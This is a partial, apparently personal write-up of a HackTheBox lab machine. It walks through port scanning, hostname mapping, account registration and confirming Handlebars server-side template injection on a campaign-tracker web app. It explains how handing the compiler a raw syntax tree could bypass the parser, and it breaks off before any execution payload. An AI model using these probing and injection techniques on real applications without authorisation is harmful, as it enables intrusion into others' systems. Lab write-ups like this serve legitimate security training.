---
link: https://app.hackthebox.com/machines/DarkZeroReturns?sort_by=created_at&sort_type=desc
description: Hard·Windows
release date: 2026-07-25
tags:
  - SN_11
image: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1fb32a5-8e1c-4d62-bf6e-d2041d6448ad-1781002585.png
solved:
solve date:
machine no.: 10
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">DarkZeroReturns Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1fb32a5-8e1c-4d62-bf6e-d2041d6448ad-1781002585.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): 0xEr3bus & Pho3o</p>
    <p style="margin: 0;">Difficulty: Hard</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Attack Chain Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Verify Target is Reachable

VPN is established but unverified. Establish that the target answers before spending time on scans that would otherwise fail silently.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

| Component   | Purpose                  | Simple Explanation                                |
| ----------- | ------------------------ | ------------------------------------------------- |
| `ping`      | Sends ICMP echo requests | Asks "are you there?" and waits for a reply       |
| `-c 4`      | Stop after 4 packets     | Otherwise it runs forever until interrupted       |
| `TARGET_IP` | Destination host         | The HTB machine address assigned to your instance |

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ ping -c 4 10.129.53.206
PING 10.129.53.206 (10.129.53.206) 56(84) bytes of data.
64 bytes from 10.129.53.206: icmp_seq=1 ttl=127 time=236 ms
64 bytes from 10.129.53.206: icmp_seq=2 ttl=127 time=234 ms
64 bytes from 10.129.53.206: icmp_seq=3 ttl=127 time=231 ms
64 bytes from 10.129.53.206: icmp_seq=4 ttl=127 time=242 ms

--- 10.129.53.206 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 231.415/235.706/241.509/3.743 ms
```

Zero packet loss confirms the VPN tunnel and target are both live.

**Key finding:** TTL 127 indicates an initial TTL of 128 decremented by a single hop. An initial TTL of 128 is the Windows default; Linux defaults to 64. Treat the host as Windows-family for now and revisit if service banners contradict it.

**Next:** With reachability confirmed, enumerate the full TCP port range to establish the exposed attack surface.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

#### 2.1.1 Full Port Sweep

Reachability is confirmed but the attack surface is unknown. Scan the full port range rather than nmap's default top 1000, since a service on a high port is a common way for boxes to hide their real entry point.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo`

**Breakdown:**

| Component         | Purpose                        | Simple Explanation                                                                                                             |
| ----------------- | ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------ |
| `nmap`            | Port scanner                   | Knocks on every door and notes which ones open                                                                                 |
| `-p-`             | Scan ports 1–65535             | The full range, not just the common ones                                                                                       |
| `--min-rate 5000` | Send at least 5000 packets/sec | Forces speed; a full-range scan at default rate takes many minutes                                                             |
| `-Pn`             | Skip host discovery            | Treat the host as up without pinging first — already verified manually                                                         |
| `TARGET_IP`       | Target                         | The HTB machine                                                                                                                |
| `\| grapo`        | Custom zsh function            | Prints full nmap output to the terminal while extracting open ports as a comma-joined list for copying into the follow-up scan |

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate 5000 -Pn 10.129.53.206 | grapo              
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-27 06:59 +0000
Nmap scan report for 10.129.53.206
Host is up (0.46s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 29.33 seconds

22,80
```

Only 22/tcp (SSH) and 80/tcp (HTTP) are exposed. No SMB (445), no LDAP (389), no Kerberos (88) — none of the ports that normally advertise a Windows domain controller.

**Next:** Fingerprint both services to identify software and versions before probing the web application.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

Two ports are confirmed open but the software behind them is unknown. Run service and version detection against only those ports to identify software, versions, and any immediate script findings.

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

| Component   | Purpose                 | Simple Explanation                                                                                                   |
| ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------- |
| `nmap`      | Port scanner            | The scanning tool                                                                                                    |
| `-A`        | Aggressive mode         | That's a superset; Bundles four things at once: version detection, default NSE scripts, OS detection, and traceroute |
| `-p 22,80`  | Restrict to these ports | Only the ports the full scan found open — no wasted time                                                             |
| `TARGET_IP` | Target                  | The HTB machine                                                                                                      |
(`-A` is equivalent to `-sC -sV -O --traceroute` combined.)

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -A -p 22,80 10.129.53.206                                                                                                    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-27 07:05 +0000
Nmap scan report for 10.129.53.206
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://dzcampaigns.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   244.38 ms 10.10.14.1
2   244.41 ms 10.129.53.206

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.90 seconds
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

| Port   | Service | Version                           | Analysis                                                                                 | Simple Explanation                                                        |
| ------ | ------- | --------------------------------- | ---------------------------------------------------------------------------------------- | ------------------------------------------------------------------------- |
| 22/tcp | SSH     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 | Current release, no known exploitable CVEs. No entry point without credentials.          | Remote login for Linux. Useless until a username and password turn up.    |
| 80/tcp | HTTP    | nginx 1.24.0 (Ubuntu)             | Reverse proxy. Redirects to a named vhost, so the real app is not served on the bare IP. | The web server. It won't show the real site until you ask for it by name. |
**Key findings:** 

- The host serving both ports is Ubuntu Linux, contradicting nmap's Windows OS guess. The OS fingerprint carries an explicit reliability warning — with 65533 ports filtered, nmap lacked the open/closed port pair it needs for accurate stack fingerprinting. Trust the service banners over the guess: the edge host is Linux, and the Windows signals belong to infrastructure behind it.

- nginx redirects to the virtual host `dzcampaigns.htb`. Resolve this name locally before any web enumeration, or every request returns the redirect instead of the application.

One web server can host many different websites on a single IP address. The way it decides which site to serve is the `Host` header — a line your browser sends with every request saying which name you typed. Request `dzcampaigns.htb` and nginx serves the campaign application; request the bare IP address and nginx has no matching site configuration, so it redirects you to the name it expects.

The problem is that `dzcampaigns.htb` isn't a real registered domain. Public DNS has never heard of it, so your machine can't resolve it to an address and the redirect goes nowhere.

The fix is `/etc/hosts`, a plain text file your system consults _before_ asking DNS. Adding a line there that maps `dzcampaigns.htb` to the target IP means your browser resolves the name locally, sends the correct `Host` header, and nginx serves the real application. This is a routine first move on almost every HTB web box — whenever a scan mentions a `.htb` domain, that domain goes in `/etc/hosts` immediately.

**Next:** Map the virtual host name to the target IP locally so the application becomes reachable.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.2 Resolve the virtual host locally

Nginx redirects requests for the bare IP to `dzcampaigns.htb`, a name public DNS cannot resolve. Map the name to the target address in the local hosts file so requests carry the correct `Host` header and reach the application.

**Command**

```bash
sudo vi /etc/hosts
```

Append the following line:

```
TARGET_IP    dzcampaigns.htb
```

**Breakdown**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`sudo`|Elevate privileges|`/etc/hosts` is system-owned and not writable by a normal user|
|`vi`|Text editor|Opens the file for editing|
|`/etc/hosts`|Local resolution table|Consulted before DNS; maps IP addresses to hostnames|
|`TARGET_IP dzcampaigns.htb`|The mapping entry|Sends any request for that name to the target machine|

Note the format: address first, then one or more names separated by whitespace. No protocol scheme, no port, no path — the file resolves names to addresses and nothing more.

**Verify**

```bash
curl -I http://dzcampaigns.htb/
```

| Component | Purpose                  | Simple Explanation                                                                                 |
| --------- | ------------------------ | -------------------------------------------------------------------------------------------------- |
| `curl`    | Command-line HTTP client | Fetches a URL without a browser                                                                    |
| `-I`      | HEAD request only        | Returns response headers and skips the page body — fast confirmation the host resolves and answers |

**Result**

```shell
┌──(kali㉿kali)-[~]
└─$ curl -I http://dzcampaigns.htb/                                                                                                   
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 27 Jul 2026 15:04:02 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2344
Connection: keep-alive
ETag: W/"928-OsnbcztKl7ijbe9shRmPWv/KaWM"
Set-Cookie: dz.sid=s%3A3Ku4I0ZOarjEdq2eSHLVXwAC8bL_ukEw.VdbqE3O8Q%2BoZvw0c8lnMtVDzvxpwOzYf16Ysxi8cV24; Path=/; Expires=Tue, 28 Jul 2026 15:04:02 GMT; HttpOnly; SameSite=Lax
```

HTTP 200 replaces the earlier redirect — the virtual host now resolves and the application responds.

**Next:** Browse the application to identify functionality, authentication endpoints, and user-controllable input.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.3 Web Enumeration
#### 2.3.1 Enumerate application functionality as an unauthenticated user

The application responds on the resolved vhost but its purpose and input surface are unknown. Browse every page reachable without credentials to map functionality before attempting authentication.

**Action**

Open the following in a browser:

- http://dzcampaigns.htb/
- http://dzcampaigns.htb/essentials
- http://dzcampaigns.htb/dice
- http://dzcampaigns.htb/login


**Result:**

`/` — "DarkZero Campaigns", a tabletop RPG campaign tracker. Displays ACTIVE CAMPAIGNS with a single entry, "The Clockwork Moon and the Thieves of Dawn", plus its narrative description, and a RECENT HEROES section listing one character: `Thomas — Goblin Guardian`.

![[dzcampaigns_home.png]]

`/essentials` — Documentation covering campaigns, character creation, inventory, dice, and a Coming Soon list.

![[dzcampaigns_essentials.png]]

`/dice` — Dice roller: DIE selector (default "6 sided"), COUNT field (default 1), ROLL button.

![[dzcampaigns_dice.png]]

http://dzcampaigns.htb/login

![[dzcampaigns_login.png]]

**Key finding:** The navigation bar exposes only four destinations and no registration link, yet the Essentials workflow lists "Register or log in" as step 1. Account creation exists but is unlinked from the UI.

**Endpoint map (unauthenticated)**

| Path          | Nav label  | Function                                 | Input surface                      | Simple Explanation                            |
| ------------- | ---------- | ---------------------------------------- | ---------------------------------- | --------------------------------------------- |
| `/`           | HOME       | Lists active campaigns and recent heroes | None                               | The front page — shows what's going on        |
| `/essentials` | ESSENTIALS | Application documentation                | None                               | A help page explaining the app's own features |
| `/dice`       | ROLL DICE  | Server-side dice roller                  | Die type (select), count (numeric) | Rolls dice for you; only accepts numbers      |
| `/login`      | LOGIN      | Authentication form                      | Email, password                    | Where you sign in                             |

**Next:** Locate the unlinked registration endpoint and create an account to reach the authenticated character-creation flow.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.3.2 Register an account and authenticate

Navigate to the login page and follow the registration link in the body text beneath the form:

![[dzcampaigns_login_register_here.png]]

Submit the registration form by clicking on 'Create Account' after entering the required details.

![[dzcampaigns_register.png]]

Registration redirects to `/login`. Authenticate with the same email and password.

**Result:**

Login succeeds and redirects to `/dashboard`:

![[dzcampaigns_dashboard.png]]

Registration is open, unverified, and requires no invitation or approval. Any unauthenticated attacker can self-provision an account.

**Next:** Open the character-creation form and enumerate its fields, paying particular attention to any field whose contents are rendered into campaign output.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.3.3 Enumerate the character creation form

Authentication is established and the dashboard exposes a CREATE CHARACTER action. Inspect every field on the form before submitting anything, to identify which inputs are treated as data and which are treated as instructions.

![[dzcampaigns_character_new.png]]

**Key findings:**

- The CUSTOM CAMPAIGN MESSAGE field accepts a **template**, not a value. Its own placeholder text demonstrates the syntax — `{{race}}`, `{{class}}`, `{{name}}` — which is Mustache-family templating. In a Node.js/Express application, the dominant implementation of that syntax is Handlebars.js. The application permits a user to supply the template that the server will compile and render. This inverts the safe arrangement described in 1.5.1 and makes server-side template injection the primary attack path.

- The message field is visually disabled with the annotation "available once a campaign is chosen". Field disabling is enforced in the browser via the HTML disabled attribute. It prevents interaction in the UI but does not prevent the parameter from being included in a crafted HTTP request. Treat the gate as advisory only.

**Note:** The default template references `{{race}}`, `{{class}}`, and `{{name}}` — the same three fields present above it. This confirms the four data fields are passed into the rendering context, meaning the template executes with access to a context object populated from user input.
<div align="center">
<br>
<br>
</div>

##### Theory — Handlebars, and what "compiling a template" means

Handlebars is a templating engine for JavaScript. You hand it a template string and a context object, and it hands you back finished text.

```
Template:  "Hello {{name}}, welcome to {{place}}."
Context:   { name: "Ned", place: "Virelia" }
Output:    "Hello Ned, welcome to Virelia."
```

The important part is _how_ it does this. Handlebars does not perform a simple find-and-replace. It runs the template through two stages:

1. **Parse.** The template string is read and converted into an **AST** — an Abstract Syntax Tree. This is a structured object describing what the template means: "here is literal text", "here is a mustache statement that looks up the variable `name`", "here is a block helper". The braces are gone by this point; what remains is a tree of typed nodes.
2. **Compile and execute.** The AST is walked and turned into an actual JavaScript function, which is then called with the context object to produce output.

Stage 2 is the dangerous one, because "turned into an actual JavaScript function" means the contents of the AST end up as executable code inside the Node.js process. Handlebars normally guards this carefully — the parser only ever produces well-formed nodes, so nothing unexpected can reach the code generator.

That guarantee holds only as long as the AST comes from the parser. If an attacker can supply the AST **directly**, skipping the parse stage, they can construct nodes the parser would never emit — nodes containing arbitrary JavaScript in fields the compiler expects to hold simple values. That is the shape of the vulnerability on this box, and it is why the next few steps focus on how the message field is transmitted rather than just what text it accepts.

**Next:** Submit a character joining the campaign with the default message intact, to establish baseline rendering behaviour and locate where the output appears.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.3.4 Submit a baseline character and locate the rendered output

The campaign message field accepts a template, but the destination of the rendered result is unknown. Submit a character with entirely benign values and the default template to establish normal behaviour before introducing any payload.

**Action**

At `http://dzcampaigns.htb/character/new`, fill in the form and submit.


| Field                   | Value                                                |
| ----------------------- | ---------------------------------------------------- |
| NAME                    | `Testchar`                                           |
| RACE                    | `Elf`                                                |
| CLASS                   | `Rogue`                                              |
| BACKSTORY               | `test`                                               |
| JOIN CAMPAIGN           | `The Clockwork Moon and the Thieves of Dawn`         |
| CUSTOM CAMPAIGN MESSAGE | _(left empty — server applies the default template)_ |

![[dzcampaigns_baseline_form.png]]

**Result — dashboard**
Submission redirects to `/dashboard`.

![[dzcampaigns_dashboard_testchar.png]]

**Result — homepage**

![[dzcampaigns_home_testchar.png]]

**Result — campaign page (`/campaign/1`)**

![[dzcampaigns_campaign1_messages.png]]

**Key findings:**

- Rendered template output appears in the MESSAGES section of `/campaign/<id>`. The default template `A new face emerges! The {{race}} {{class}} {{name}} has joined the campaign...` rendered as `A new face emerges! The Elf Rogue Testchar has joined the campaign...`. Placeholders were substituted, in template order, with the values supplied in the character form. This is server-side template compilation with a context object built from user input — confirming the hypothesis from 1.5.1 and 1.7.

- The campaign page is `/campaign/1`. Its numeric identifier is required for any request that targets the join action directly.

- The pre-existing message from user Thomas, dated `Sun Apr 19 2026`, uses the same default template. A single shared rendering pipeline handles all arrival messages; it is not a per-character code path.

- The homepage renders only name, race, and class — never the message. The campaign page is the only location where template output is displayed. Direct all injection verification there.

**Note:** Submission redirects to `/dashboard` rather than to a character detail page, so the character ID is not exposed in the address bar at creation time. Retrieve it from the EDIT action instead.

**Next:** Retrieve the character ID from the EDIT action to obtain a repeatable submission endpoint, then probe the message field with Handlebars syntax to confirm server-side evaluation.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.3.5 Obtain the character ID and a repeatable submission endpoint

**Action**

From `/dashboard`, click EDIT on the character row.

**Result**

Browser navigates to: http://dzcampaigns.htb/character/16/edit

![[dzcampaigns_character16_edit.png]]

Form contents:

|Field|Value on load|Difference from creation form|
|---|---|---|
|NAME|`Testchar`|Pre-populated with stored value|
|RACE|`Elf`|Pre-populated with stored value|
|CLASS|`Rogue`|Pre-populated with stored value|
|BACKSTORY|`test`|Pre-populated with stored value|
|JOIN CAMPAIGN|_(absent)_|Dropdown removed — campaign binding is fixed|
|UPDATE CAMPAIGN MESSAGE|_(empty)_|Relabelled; annotated "posts to The Clockwork Moon and the Thieves of Dawn (optional)"; **not disabled**|

Submit button reads **SAVE CHANGES**.

**Key findings:** 

- The character ID is `16`. The edit route follows the pattern `/character/<id>/edit`, and the underlying update is submitted to `/character/<id>`.

- The message field on the edit form carries no `disabled` attribute — the client-side gate present on the creation form is absent here entirely. No dropdown manipulation is required to reach the template surface.

- The field loads empty rather than displaying the previously stored template, and the label changes from "custom arrival message" to "update campaign message". Each save appends a new message to the campaign rather than modifying the existing one, so test iterations accumulate as separate entries and require no cleanup between attempts.

**Testing loop established:**

```
POST /character/16  (via SAVE CHANGES)  →  view http://dzcampaigns.htb/campaign/1
```

**Next:** Probe the message field with Handlebars control syntax to confirm the input is parsed as a template rather than escaped as literal text.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.3.6 Probe the message field to confirm and characterise template injection

The CUSTOM CAMPAIGN MESSAGE field accepts what appears to be Handlebars syntax, and its own placeholder text demonstrates `{{race}} {{class}} {{name}}`. Submit a series of probes to establish first whether input is compiled at all, then where the language's limits lie.

**Probes:**

Enter each payload into UPDATE CAMPAIGN MESSAGE at `http://dzcampaigns.htb/character/15/edit`, click SAVE CHANGES, and check `http://dzcampaigns.htb/campaign/1` after each.

```handlebars
{{#if true}}yes{{/if}}
```

```handlebars
{{77}}
```

```handlebars
{{{77}}}
```

```handlebars
{{7*7}}
```

**Breakdown**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`{{ }}`|Mustache expression, HTML-escaped output|The standard "put something here" marker|
|`{{{ }}}`|Mustache expression, unescaped output|Same, but outputs raw HTML instead of escaping it|
|`{{#if ...}}` … `{{/if}}`|Block helper with condition and body|An "only show this if…" section|
|`true`|Condition argument|Always true, so the body always renders|
|`yes`|Block body|The marker string to look for in output|
|`77`|Bare numeric token — a syntactically valid path|Tests whether a valid but non-existent name resolves|
|`7*7`|Arithmetic expression containing `*`|Tests whether the language permits computation|

**Result**

`{{#if true}}yes{{/if}}` — renders as `yes`:

```
A new face emerges! The Goblin Guardian Thomas has joined the campaign...
Sun Apr 19 2026 15:45:03 GMT+0000 (Coordinated Universal Time)

A new face emerges! The Elf Rogue Testchar has joined the campaign...
Tue Jul 28 2026 18:58:00 GMT+0000 (Coordinated Universal Time)

yes
Tue Jul 28 2026 18:58:43 GMT+0000 (Coordinated Universal Time)
```

![[dzcampaigns_ssti_confirmed.png]]

`{{77}}` — saves successfully, message body empty:

```
(no text)
Tue Jul 28 2026 19:02:25 GMT+0000 (Coordinated Universal Time)
```

`{{{77}}}` — identical to `{{77}}`: saves successfully, message body empty. Arbitrary alphanumeric strings behave the same way.

`{{7*7}}` — save fails. Browser remains at `/character/15` and displays an application error page. No message is written to `/campaign/1`:

```
Something Went Amiss
Something went wrong. Please try again.
[ ← GO BACK ]
```

![[dzcampaigns_7x7_parse_error.png]]

**What this gives you:** Confirmation of the vulnerability plus a map of the engine's behaviour across three distinct input classes.

|Input|Outcome|Cause|Simple Explanation|
|---|---|---|---|
|`{{#if true}}yes{{/if}}`|Renders `yes`|Valid syntax, helper evaluated|Understood and obeyed|
|`{{77}}`, `{{{77}}}`, `{{abc123}}`|Empty message saved|Valid syntax, lookup returned undefined|Understood, but there was nothing to fetch|
|`{{7*7}}`|Server error, nothing saved|**Invalid syntax — parser threw**|Not understood; refused outright|

**Key finding:**

- Server-side template injection confirmed. `{{#if true}}yes{{/if}}` rendered as `yes`. All syntax was consumed and the conditional evaluated server-side. Had the field been treated as inert text the campaign page would display the input verbatim; had it been HTML-escaped it would display the braces as entities. Neither occurred.

- Output is stored, not merely reflected. The rendered result persists on `/campaign/1` and is visible to every visitor, making this a stored injection rather than a transient one.

- `{{77}}` renders empty. The expression is a syntactically valid path, so the parser accepts it; the context object contains no key named `77`, so the lookup returns undefined, and Handlebars renders undefined as empty by design. Failed lookups degrade silently and must not be read as rejection.

- Escaped and unescaped forms behave identically. `{{{77}}}` produces the same empty result as `{{77}}`, so HTML-escaping is not the operative constraint and offers no leverage.

- the parser is provably executing on submitted strings.** `{{7*7}}` raises a server-side exception because `*` is not a legal character in a Handlebars path expression. The engine tokenises the input, fails to match its grammar, and throws before any rendering occurs. Silent empty output and a hard error are produced by two different stages — lookup failure versus parse failure.

- Handlebars supports no arithmetic. Unlike Jinja2 or FreeMarker, where `{{7*7}}` returns `49`, the language has no expression evaluation at all. Escape techniques that rely on the template language computing values are unavailable here.

- The application applies no sanitisation or filtering before invoking the engine. Input reaches Handlebars unfiltered; the only constraint is the engine's own grammar.
<div align="center">
<br>
<br>
</div>

##### What a template is, and what went wrong here

Think of a form letter. Someone writes it once, with blanks:

> "Dear `<<name>>`, your appointment is on `<<date>>`."

The blanks get filled in per person. The letter itself never changes; only what goes in the blanks changes. That's a template. The letter is the template, the names and dates are the values.

This application has a template. Its form letter reads:

> "A new face emerges! The `{{race}}` `{{class}}` `{{name}}` has joined the campaign."

Those `{{ }}` marks are the blanks. On character creation the server fills them with Elf, Rogue, Testchar and posts the result.

**The mistake.** Users are supposed to fill in blanks. They are not supposed to be handed the letter itself and told "write whatever you like." That is exactly what CUSTOM CAMPAIGN MESSAGE does — it asks for the whole form letter rather than a value to slot in. The user writes the letter; the server reads it and does what it says.

**Why that's dangerous.** Filling in blanks is not a copy-paste operation. A piece of software reads the letter, understands it, and acts on it — and that software understands more than blanks. It understands instructions.

`{{#if true}}yes{{/if}}` is an instruction: _if this condition holds, print "yes."_ Submitting it returned `yes`. Not the instruction — the _result_ of following it. The server did not store the text. It read it, understood it as a command, obeyed it, and published the outcome.

This particular instruction is harmless. The question it opens is what else will be obeyed.

**What language is this?** The component reading these instructions is **Handlebars**. It is not a general-purpose programming language; it is a small special-purpose one built for filling in form letters.

It is written in JavaScript and runs inside JavaScript programs. That matters enormously: Handlebars is a small language living _inside_ a big one. If you can get from the small language into the big one, the big one can read files, open network connections, and run system commands. The rest of this box hangs on that door.
<div align="center">
<br>
<br>
</div>

#####  How the vulnerability was identified, and why these probes

Three observations stacked up, none sufficient alone.

The response headers carried a cookie named `dz.sid` beginning `s%3A` — a signature of Express, a JavaScript web framework. So: JavaScript on the server. Filed away.

The Essentials page then described its own behaviour: when a character joins a campaign, a message is written to the log. Text is being generated from user input. Filed away.

Then the form itself. The placeholder text in the message box printed `{{race}} {{class}} {{name}}` on screen — the application demonstrating its own template syntax in the hint text, on a field it invites the user to overwrite. Curly-brace syntax plus a JavaScript server points specifically at Handlebars.

The reasoning: JavaScript server + user writes the form letter + curly braces = probably Handlebars, probably compiled server-side. A hypothesis, not a finding. `{{#if true}}yes{{/if}}` was the cheapest experiment capable of proving or killing it.

**Why the conditional specifically.** Because it cannot be faked. Submitting `{{name}}` and receiving `Testchar` proves less than it appears — a lazy developer achieves the same with plain find-and-replace: search for `{{name}}`, swap in the value, done. No understanding, no execution, just swapping.

Find-and-replace cannot produce `yes` from `{{#if true}}yes{{/if}}`. Something must recognise `#if` as a conditional, locate its matching close tag, isolate the body between them, evaluate `true`, and decide to emit. That is comprehension, not substitution.

The habit worth keeping: choose a probe whose result can _only_ be explained by execution. `{{7*7}}` returning `49` works the same way in other engines — nothing copies `7*7` and accidentally produces `49`.
<div align="center">
<br>
<br>
</div>

##### Logic-less by design, and where the restriction lives

Handlebars markets itself as a _logic-less_ engine. The philosophy is that templates should describe presentation rather than do computation.

In practice the language is intentionally crippled. No arithmetic. No arbitrary function calls. No attribute chains walking into the host runtime. What remains is path lookups, string and number literals, and a fixed set of built-in helpers — `if`, `unless`, `each`, `with`, `lookup`, `log` — plus whatever the developer registered.

This is why Handlebars injection is harder than injection into Jinja2 or Twig. There, the template language itself performs arithmetic, indexes into objects, and walks attribute chains until it reaches something dangerous like `os.system`; code execution is often achievable using nothing but the language's own features. Handlebars offers none of that. The language is too small to escape from.

But note _where_ the restriction is implemented. It is not a runtime check. It is the **grammar**, enforced by the parser, at the moment text becomes a syntax tree. `{{7*7}}` fails because the parser cannot construct a node for it — the failure occurs before anything is compiled or rendered.

Recall the two-stage design from 1.7.1. Stage one parses text into a tree. Stage two compiles that tree into a JavaScript function and runs it. Every safety property of the language lives in stage one. Stage two is written on the assumption that its input came from stage one and is therefore well-formed — it validates nothing, because the parser already guaranteed everything.

So the question is not "how do I write a template that escapes Handlebars?" That question has no answer; the grammar forbids it. The question is: **is there any way to hand the compiler a tree the parser never saw?**

If so, none of the restrictions apply — not because they were bypassed, but because the code enforcing them never ran.
<div align="center">
<br>
<br>
</div>

**Next:** Determine how the message field is transmitted to the server, and whether the transport permits sending anything other than a plain string.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.3.7 — Capture the save request and identify the transport encoding

Every probe so far has been submitted through the browser form, and each was constrained by the Handlebars grammar. Inspect the actual HTTP request to determine the endpoint, method, and the encoding used to transmit the template field.

**Action:**

Open DevTools (F12), select the **Network** tab, then click SAVE CHANGES on `http://dzcampaigns.htb/character/<id>/edit`. Select the request named `<id>`(15 in my case) and read the Headers sub-tab.

**Result**

![[dzcampaigns_devtools_network_save.png]]

General:

```
Request URL:      http://dzcampaigns.htb/character/15
Request Method:   POST
Status Code:      302 Found
Remote Address:   TARGET_IP:80
Referrer Policy:  strict-origin-when-cross-origin
```

Request Headers:

```
Content-Type:     application/x-www-form-urlencoded
Content-Length:   142
Host:             dzcampaigns.htb
Origin:           http://dzcampaigns.htb
Referer:          http://dzcampaigns.htb/character/15/edit
Cookie:           dz.sid=s%3AFm3wH_F9QgIP35oZHKCjdS-fIjoiTjoV.9EVBxQvlIJP%2FQerzDUID3FXj9TLCohrl0S%2FgrvfKvRc
```

Response Headers:

```
Connection:       keep-alive
Content-Length:   39
Content-Type:     text/html; charset=utf-8
Server:           nginx/1.24.0 (Ubuntu)
Location:         /dashboard
Set-Cookie:       dz.sid=s%3AFm3wH_F9QgIP35oZHKCjdS-fIjoiTjoV.9EVBxQvlIJP%2FQerzDUID3FXj9TLCohrl0S%2FgrvfKvRc
```

==**What this gives you:** The exact request contract for template submission.==

==**Key finding:** The update endpoint is `POST /character/15`. The edit form is served at `/character/15/edit` but submits to `/character/15`, confirmed by the `Referer` header. The response is a 302 redirect to `/dashboard`, which is why no character detail page is ever displayed.==

==**Key finding: the transport is `application/x-www-form-urlencoded`.** This is the browser's default HTML form encoding and it is strictly flat — key–value pairs of text, with no capacity to represent numbers, arrays, or nested objects. Every field submitted through the browser therefore arrives at the server as a **string**, including `campaign_message`. The string is passed to Handlebars, which parses it, and every parser-level restriction applies. This fully explains the probe results: the grammar rejected `{{7*7}}` because a string is all the server ever received.==

==**Key finding:** The encoding is a property of the browser form, not of the endpoint. Nothing in the request or response indicates the server accepts only this content type.==

==**Key finding:** Session state is carried entirely in the `dz.sid` cookie, which is reissued on each response. Any request constructed outside the browser must carry this cookie to authenticate.==

==**Key finding:** The response is a 302 with `Content-Length: 39` — a redirect stub, not rendered content. Template output is never returned in the response to the save request and must be retrieved separately from `/campaign/1`.==
<div align="center">
<br>
<br>
</div>

##### Theory — Why the encoding of a request decides what an attacker can send

==Two formats commonly carry data in a POST body, and the difference between them is the hinge this entire box turns on.==

